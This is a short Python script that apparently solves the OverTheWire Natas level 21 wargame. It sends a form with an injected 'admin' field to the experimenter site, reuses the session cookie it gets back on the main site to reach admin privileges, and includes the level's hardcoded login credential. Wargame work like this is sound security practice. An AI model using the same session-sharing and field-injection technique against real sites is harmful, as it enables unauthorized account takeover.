import requests

experimenter_url = "http://natas21-experimenter.natas.labs.overthewire.org/"
main_url = "http://natas21.natas.labs.overthewire.org/"
auth = ("natas21", "7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU")

# Step 1: submit the poisoned form to the experimenter site
r1 = requests.post(experimenter_url, auth=auth, data={"submit": "Update", "admin": "1"})

# Grab the PHPSESSID the experimenter site assigned us
session_id = r1.cookies.get("PHPSESSID")
print("Got session ID:", session_id)

# Step 2: present that same session ID to the main natas21 site
r2 = requests.get(main_url, auth=auth, cookies={"PHPSESSID": session_id})
print(r2.text)